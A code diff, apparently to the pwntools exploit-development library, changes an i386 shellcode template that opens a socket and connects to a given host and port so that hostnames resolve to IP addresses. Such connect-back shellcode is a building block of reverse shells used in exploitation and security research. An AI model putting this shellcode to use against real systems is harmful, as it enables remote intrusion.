@@ -1,6 +1,6 @@
 <% from pwnlib.shellcraft import common %>
-<% from pwnlib.shellcraft import i386 %> 
-<% from socket import htons, inet_aton %>
+<% from pwnlib.shellcraft import i386 %>
+<% from socket import htons, inet_aton, gethostbyname %>
 <% from pwnlib.util import packing %>
 
 <%page args="host, port"/>
@@ -24,7 +24,10 @@ int 0x80
 /* save opened socket */
 mov ebp, eax
 
-${i386.pushstr(inet_aton(host), False)}
+<% ip_addr = gethostbyname(str(host)) %>
+/* ${repr(host)} == ${ip_addr} */
+${i386.pushstr(inet_aton(ip_addr), False)}
+
 pushw ${htons(port)}
 pushw AF_INET
 mov ecx, esp
